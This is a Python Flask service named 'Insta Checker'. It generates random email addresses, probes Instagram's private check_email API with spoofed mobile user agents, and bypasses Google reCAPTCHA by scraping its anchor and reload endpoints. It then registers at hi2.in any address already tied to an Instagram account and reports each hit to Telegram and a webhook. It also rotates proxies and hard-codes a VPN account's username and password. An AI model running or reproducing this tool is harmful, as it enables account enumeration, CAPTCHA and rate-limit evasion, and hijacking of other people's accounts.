import sys
import os
import requests
import string
import random
import time
from threading import Thread, Lock 
import subprocess
import uuid
import json
import logging
from flask import Flask, request, jsonify
from datetime import datetime, timedelta
import signal
import gc
from queue import Queue
import re

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Install dependencies if needed
def install_dependencies():
    try:
        import h2
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
    
    try:
        import httpx
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
        import httpx
    
    try:
        from cfonts import render
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "cfonts==1.5.2"])
        from cfonts import render

# Install dependencies
try:
    install_dependencies()
except Exception as e:
    logger.warning(f"Some dependencies failed: {e}")

# Create Flask app for web service
app = Flask(__name__)

# ============ STARTER PLAN OPTIMIZED SETTINGS ============
THREAD_COUNT = 3  # Optimal for 512MB RAM
DELAY_BETWEEN_REQUESTS = 0.8  # Reduced with proxies
MAX_RETRIES = 2
REQUEST_TIMEOUT = 30
MEMORY_CLEAN_INTERVAL = 100
PROXY_ROTATION_INTERVAL = 5  # Rotate proxy every 5 requests

# Track start time
start_time = time.time()
request_count = 0
last_memory_clean = time.time()
proxy_index = 0
proxy_usage_count = {}

# Global variables
used_usernames = set()
lock = Lock()
hit = 0
badig = 0
badmil = 0
dead = 0
is_running = False
error_count = 0
total_requests = 0
proxies = []
proxy_stats = {}

# ============ PROXY HANDLING ============

def load_proxies():
    """Load proxies from file or environment variable"""
    global proxies, proxy_stats
    
    # Try to load from file first
    proxy_files = ['px041202.pointtoserver.com10780purevpn0s8959450.txt', 'proxies.txt']
    loaded = False
    
    for filename in proxy_files:
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            # Parse proxy format: host:port:username:password
                            parts = line.split(':')
                            if len(parts) >= 4:
                                proxy = {
                                    'host': parts[0],
                                    'port': parts[1],
                                    'username': parts[2],
                                    'password': parts[3],
                                    'type': 'socks5' if 'socks' in parts[0].lower() else 'http'
                                }
                                proxies.append(proxy)
                                proxy_stats[parts[0]] = {'used': 0, 'success': 0, 'failed': 0, 'last_used': None}
                                loaded = True
                    if loaded:
                        logger.info(f"✅ Loaded {len(proxies)} proxies from {filename}")
                        break
            except Exception as e:
                logger.error(f"Error loading proxies from {filename}: {e}")
    
    # If no file, try environment variable
    if not loaded and os.environ.get('PROXY_LIST'):
        proxy_data = os.environ.get('PROXY_LIST').split(';')
        for proxy_str in proxy_data:
            parts = proxy_str.split(':')
            if len(parts) >= 4:
                proxy = {
                    'host': parts[0],
                    'port': parts[1],
                    'username': parts[2],
                    'password': parts[3],
                    'type': 'socks5' if 'socks' in parts[0].lower() else 'http'
                }
                proxies.append(proxy)
                proxy_stats[parts[0]] = {'used': 0, 'success': 0, 'failed': 0, 'last_used': None}
                loaded = True
        if loaded:
            logger.info(f"✅ Loaded {len(proxies)} proxies from environment")
    
    # If still no proxies, use default proxy from your list
    if not loaded:
        logger.warning("⚠️ No proxy file found. Using default fallback proxy.")
        default_proxies = [
            {'host': 'px041202.pointtoserver.com', 'port': '10780', 'username': 'purevpn0s8959450', 'password': 'abcd1234', 'type': 'http'},
            {'host': 'px031901.pointtoserver.com', 'port': '10780', 'username': 'purevpn0s8959450', 'password': 'abcd1234', 'type': 'http'},
            {'host': 'px490402.pointtoserver.com', 'port': '10780', 'username': 'purevpn0s8959450', 'password': 'abcd1234', 'type': 'http'},
        ]
        proxies = default_proxies
        for proxy in default_proxies:
            proxy_stats[proxy['host']] = {'used': 0, 'success': 0, 'failed': 0, 'last_used': None}
        logger.info(f"✅ Using {len(proxies)} default proxies")
    
    return proxies

def get_proxy():
    """Get next proxy in rotation"""
    global proxy_index, proxies, proxy_usage_count
    
    if not proxies:
        return None
    
    # Try to get a working proxy
    for _ in range(len(proxies)):
        proxy = proxies[proxy_index % len(proxies)]
        proxy_index += 1
        
        # Check if proxy has been used too much
        host = proxy['host']
        proxy_usage_count[host] = proxy_usage_count.get(host, 0) + 1
        
        # Reset usage if needed
        if proxy_usage_count[host] > PROXY_ROTATION_INTERVAL:
            proxy_usage_count[host] = 0
            continue
            
        return proxy
    
    # If all proxies are used up, return the first one
    return proxies[0]

def get_proxy_url(proxy):
    """Format proxy for requests"""
    if not proxy:
        return None
    
    if proxy.get('type') == 'socks5':
        return f"socks5://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"
    else:
        return f"http://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"

def test_proxy(proxy):
    """Test if proxy is working"""
    try:
        test_url = "http://httpbin.org/ip"
        proxy_url = get_proxy_url(proxy)
        
        response = requests.get(
            test_url,
            proxies={'http': proxy_url, 'https': proxy_url},
            timeout=5
        )
        
        if response.status_code == 200:
            logger.info(f"✅ Proxy {proxy['host']} is working")
            return True
        return False
    except Exception as e:
        logger.debug(f"Proxy test failed for {proxy['host']}: {e}")
        return False

# ============ END PROXY HANDLING ============

def memory_cleanup():
    """Clean memory to prevent leaks on Starter Plan"""
    gc.collect()
    if len(used_usernames) > 10000:
        with lock:
            temp_set = set(list(used_usernames)[-5000:])
            used_usernames.clear()
            used_usernames.update(temp_set)

def banner():
    try:
        from cfonts import render
        output = render('Insta Checker', colors=['red', 'yellow'], align='center')
        print(output)
        print("=" * 60)
        print("        DEV / @sm4ss    |    Proxy-Enabled Optimized")
        print("=" * 60)
        print(f"        Proxies Loaded: {len(proxies)}")
        print("=" * 60)
    except:
        print("=" * 60)
        print("        Instagram Email Checker    |    Proxy-Enabled")
        print("        DEV / @sm4ss")
        print("=" * 60)
        print(f"        Proxies Loaded: {len(proxies)}")
        print("=" * 60)

# Get token from environment variable
TOKEN = os.environ.get('BOT_TOKEN', '')
CHAT_ID = os.environ.get('CHAT_ID', '')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

if not TOKEN or not CHAT_ID:
    logger.warning("BOT_TOKEN or CHAT_ID not set. Telegram notifications disabled.")

def generate_android_ua():
    devices = [
        {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820"},
        {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825"},
        {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama"},
        {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven"},
        {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther"},
        {"brand": "OnePlus", "model": "NE2213", "device": "lemonadep", "board": "lahaina"},
        {"brand": "Xiaomi", "model": "M2012K11G", "device": "venus", "board": "kona"},
    ]
    device = random.choice(devices)
    android_version = random.choice(["11", "12", "13", "14"])
    api_level = {"11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
    dpi = random.choice(["420", "440", "450", "480"])
    width, height = "1080", "2400"
    instagram_ver = random.choice(["330.1.0.45.110", "331.0.0.45.110", "332.0.0.45.110"])
    locale = random.choice(["en_US", "ar_SA", "fr_FR", "es_ES"])
    random_num = random.randint(300000000, 400000000)
    
    ua = (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
          f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
          f"{device['device']}; {device['board']}; {locale}; {random_num})")
    return ua

def send_telegram_message(msg, retry=0):
    """Send message with retry logic"""
    if not TOKEN or not CHAT_ID:
        return False
    try:
        response = requests.get(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            params={"chat_id": CHAT_ID, "text": msg},
            timeout=5
        )
        return response.status_code == 200
    except Exception as e:
        if retry < MAX_RETRIES:
            time.sleep(1)
            return send_telegram_message(msg, retry + 1)
        logger.error(f"Telegram send failed: {e}")
        return False

def info(user):
    global hit, request_count
    dom = user.split("@")[1]
    hit += 1
    request_count += 1
    
    msg = f'''
╔═══════════════════╗
║   ✅ HIT FOUND    ║
╠═══════════════════╣
║ 📧 {user}
║ 🌐 {dom}
╠═══════════════════╣
║ By @sm4ss
╚═══════════════════╝
'''
    try:
        with open('hits.txt', 'a') as ff:
            ff.write(f"{datetime.now().isoformat()} - {user}\n")
        
        send_telegram_message(msg)
        
        if WEBHOOK_URL:
            try:
                requests.post(WEBHOOK_URL, json={"email": user, "domain": dom}, timeout=5)
            except:
                pass
            
    except Exception as e:
        logger.error(f"Error saving hit: {e}")

def solve_recaptcha(proxy=None):
    """Get recaptcha token with proxy support"""
    try:
        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=ar&v=TnA7HacJFoBWt9hnlunBlYfK&size=invisible&anchor-ms=20000&execute-ms=30000&cb=x552vg5lfo2g"
        params = anchor_url.split('?')[1]
        
        headers = {
            'authority': 'www.google.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://hi2.in/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'upgrade-insecure-requests': '1',
            'user-agent': generate_android_ua(),
        }
        
        # Use proxy if provided
        proxies = None
        if proxy:
            proxy_url = get_proxy_url(proxy)
            proxies = {'http': proxy_url, 'https': proxy_url}
        
        r = requests.get(f'https://www.google.com/recaptcha/api2/anchor?{params}', 
                        headers=headers, timeout=10, proxies=proxies)
        if 'recaptcha-token" value="' not in r.text:
            return None
            
        recaptcha_token = r.text.split('recaptcha-token" value="')[1].split('"')[0]
        
        payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={recaptcha_token}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=ar&size=invisible"
        
        reload_headers = {
            "User-Agent": generate_android_ua(),
            "Referer": "https://www.google.com/recaptcha/api2/anchor",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        resp = requests.post('https://www.google.com/recaptcha/api2/reload', 
                           data=payload, headers=reload_headers, timeout=10, proxies=proxies)
        if 'resp","' in resp.text:
            return resp.text.split('resp","')[1].split('"')[0]
        return None
    except Exception as e:
        logger.debug(f"Recaptcha error: {e}")
        return None

def check_email(email, proxy=None):
    global badmil, error_count, total_requests
    total_requests += 1
    
    if "@" not in email:
        return

    domain = email.split("@")[1]
    prefix = email.split("@")[0]

    solve = solve_recaptcha(proxy)
    if not solve:
        badmil += 1
        return

    data = {
        'domain': domain,
        'prefix': prefix,
        'recaptcha': solve,
    }
    headers = {
        'User-Agent': generate_android_ua(),
        'Accept': "application/json, text/plain, */*",
        'Accept-Language': "ar,en-US;q=0.9,en;q=0.8",
        'Origin': "https://hi2.in",
        'Referer': "https://hi2.in/",
        'authorization': "Basic bnVsbA==",
    }
    
    # Use proxy if provided
    proxies = None
    if proxy:
        proxy_url = get_proxy_url(proxy)
        proxies = {'http': proxy_url, 'https': proxy_url}
    
    try:
        response = requests.post("https://hi2.in/api/custom", 
                               data=data, headers=headers, 
                               timeout=REQUEST_TIMEOUT, proxies=proxies)
        res = response.json()
        if "already taken" in str(res) or res.get('status') == 'error':
            badmil += 1
        else:
            info(email)
            # Mark proxy as successful
            if proxy:
                proxy_stats[proxy['host']]['success'] += 1
    except Exception as e:
        logger.debug(f"Check email error: {e}")
        badmil += 1
        error_count += 1
        # Mark proxy as failed
        if proxy:
            proxy_stats[proxy['host']]['failed'] += 1

def rest(email):
    global bad_user, hit, badig, badmil, dead, error_count, total_requests
    
    # Get a proxy for this request
    proxy = get_proxy()
    if proxy:
        proxy_stats[proxy['host']]['used'] += 1
        proxy_stats[proxy['host']]['last_used'] = datetime.now().isoformat()
    
    try:
        url = "https://i.instagram.com/api/v1/users/check_email/"
        id_data = str(uuid.uuid4())
        
        payload = {
            "email": email,
            "device_id": id_data,
            "guid": id_data,
            "_csrftoken": "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
        }
        
        headers = {
            'User-Agent': generate_android_ua(),
            'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '936619743392459'
        }
        
        # Prepare proxy for requests
        proxies = None
        if proxy:
            proxy_url = get_proxy_url(proxy)
            proxies = {'http': proxy_url, 'https': proxy_url}
        
        # Try HTTPX first with proxy
        try:
            import httpx
            # HTTPX with proxy
            if proxy:
                with httpx.Client(http2=True, timeout=REQUEST_TIMEOUT, proxies=proxy_url) as client:
                    response = client.post(url, data=payload, headers=headers)
                    if 'email_is_taken' in response.text:
                        check_email(email, proxy)
                    else:
                        badig += 1
            else:
                with httpx.Client(http2=True, timeout=REQUEST_TIMEOUT) as client:
                    response = client.post(url, data=payload, headers=headers)
                    if 'email_is_taken' in response.text:
                        check_email(email, proxy)
                    else:
                        badig += 1
        except Exception as e:
            # Fallback to requests with proxy
            logger.debug(f"HTTPX fallback: {e}")
            response = requests.post(url, data=payload, headers=headers, 
                                   timeout=REQUEST_TIMEOUT, proxies=proxies)
            if 'email_is_taken' in response.text:
                check_email(email, proxy)
            else:
                badig += 1
                
    except Exception as e:
        logger.debug(f"Rest error: {e}")
        dead += 1
        error_count += 1
        if proxy:
            proxy_stats[proxy['host']]['failed'] += 1
    
    # Periodic memory cleanup
    global last_memory_clean
    if total_requests % MEMORY_CLEAN_INTERVAL == 0:
        memory_cleanup()
        last_memory_clean = time.time()

def users():    
    while is_running:
        try:
            # Generate username
            user1 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5))
            user2 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
            chosen_user = random.choice([user1, user2])
                  
            with lock:
                if chosen_user in used_usernames:
                    continue
                used_usernames.add(chosen_user)
                
            chos = random.choice(["@hi2.in", "@telegmail.com"])
            email = chosen_user + chos
            rest(email)
            
            # Delay between requests
            time.sleep(DELAY_BETWEEN_REQUESTS)
            
        except Exception as e:
            logger.error(f"Thread error: {e}")
            time.sleep(5)  # Wait on error

@app.route('/')
def home():
    uptime = time.time() - start_time
    return jsonify({
        "status": "running" if is_running else "stopped",
        "plan": "Starter (Proxy-Enabled)",
        "hits": hit,
        "bad_ig": badig,
        "bad_mail": badmil,
        "dead": dead,
        "errors": error_count,
        "total_checked": hit + badig + badmil + dead,
        "total_requests": total_requests,
        "is_running": is_running,
        "threads": THREAD_COUNT,
        "uptime": str(timedelta(seconds=int(uptime))),
        "bot_configured": bool(TOKEN and CHAT_ID),
        "proxy_count": len(proxies),
        "memory_usage": f"{len(used_usernames)} cached emails"
    })

@app.route('/proxies')
def proxy_list():
    """Get proxy statistics"""
    return jsonify({
        "total_proxies": len(proxies),
        "proxy_stats": proxy_stats,
        "proxy_usage": proxy_usage_count,
        "active_proxies": len([p for p in proxy_stats if proxy_stats[p]['success'] > 0])
    })

@app.route('/proxy/test/<int:index>')
def test_proxy_endpoint(index):
    """Test a specific proxy"""
    if index < len(proxies):
        proxy = proxies[index]
        result = test_proxy(proxy)
        return jsonify({
            "proxy": f"{proxy['host']}:{proxy['port']}",
            "working": result
        })
    return jsonify({"error": "Proxy index out of range"}), 404

@app.route('/start')
def start():
    global is_running
    if not is_running:
        is_running = True
        for _ in range(THREAD_COUNT):
            Thread(target=users, daemon=True).start()
        send_telegram_message("✅ Checker started with proxy support!")
        return jsonify({
            "status": "started", 
            "threads": THREAD_COUNT,
            "proxies": len(proxies),
            "message": f"Checker started with {THREAD_COUNT} threads and {len(proxies)} proxies"
        })
    return jsonify({"status": "already running", "message": "Checker is already running"})

@app.route('/stop')
def stop():
    global is_running
    if is_running:
        is_running = False
        send_telegram_message("⏹️ Checker stopped")
        return jsonify({"status": "stopped", "message": "Checker stopped gracefully"})
    return jsonify({"status": "not running", "message": "Checker is not running"})

@app.route('/stats')
def stats():
    uptime = time.time() - start_time
    total = hit + badig + badmil + dead
    working_proxies = len([p for p in proxy_stats if proxy_stats[p]['success'] > 0])
    return jsonify({
        "hits": hit,
        "bad_ig": badig,
        "bad_mail": badmil,
        "dead": dead,
        "errors": error_count,
        "total_checked": total,
        "hit_rate": f"{(hit / total * 100):.2f}%" if total > 0 else "0%",
        "threads": THREAD_COUNT,
        "uptime": str(timedelta(seconds=int(uptime))),
        "proxies": {
            "total": len(proxies),
            "working": working_proxies,
            "success_rate": f"{(working_proxies / len(proxies) * 100):.2f}%" if proxies else "0%"
        }
    })

@app.route('/config')
def config():
    return jsonify({
        "threads": THREAD_COUNT,
        "delay": DELAY_BETWEEN_REQUESTS,
        "max_retries": MAX_RETRIES,
        "timeout": REQUEST_TIMEOUT,
        "memory_clean_interval": MEMORY_CLEAN_INTERVAL,
        "proxy_rotation_interval": PROXY_ROTATION_INTERVAL,
        "plan": "Starter (Proxy-Enabled)",
        "proxies_loaded": len(proxies)
    })

@app.route('/health')
def health():
    global is_running
    uptime = time.time() - start_time
    return jsonify({
        "status": "alive",
        "is_running": is_running,
        "uptime": str(timedelta(seconds=int(uptime))),
        "threads": THREAD_COUNT,
        "total_checked": hit + badig + badmil + dead,
        "memory_cache": len(used_usernames),
        "proxies": len(proxies)
    })

# Error handler
@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error"}), 500

if __name__ == "__main__":
    # Load proxies first
    load_proxies()
    
    banner()
    
    # Test some proxies
    logger.info("Testing proxies...")
    working_proxies = 0
    for i, proxy in enumerate(proxies[:5]):  # Test first 5
        if test_proxy(proxy):
            working_proxies += 1
            proxy_stats[proxy['host']]['success'] = 1
    logger.info(f"✅ {working_proxies}/{min(5, len(proxies))} proxies working")
    
    # Log configuration
    logger.info(f"Starter Plan Proxy-Enabled Configuration:")
    logger.info(f"  - Threads: {THREAD_COUNT}")
    logger.info(f"  - Delay: {DELAY_BETWEEN_REQUESTS}s")
    logger.info(f"  - Proxies: {len(proxies)}")
    logger.info(f"  - Timeout: {REQUEST_TIMEOUT}s")
    
    # Configure bot
    if TOKEN and CHAT_ID:
        logger.info(f"✅ Bot configured with token: {TOKEN[:10]}...")
        send_telegram_message(f"🚀 Instagram Checker started with {len(proxies)} proxies!")
    else:
        logger.warning("⚠️ Bot token or chat ID not configured.")
        logger.info("Set BOT_TOKEN and CHAT_ID environment variables for notifications.")
    
    # Auto-start on Render
    if os.environ.get('RENDER'):
        logger.info("✅ Running on Render.com - Auto-starting checker...")
        is_running = True
        for i in range(THREAD_COUNT):
            Thread(target=users, daemon=True).start()
            logger.info(f"  - Thread {i+1}/{THREAD_COUNT} started")
    
    # Start Flask app
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 Starting web server on port {port}")
    app.run(host='0.0.0.0', port=port, threaded=True)
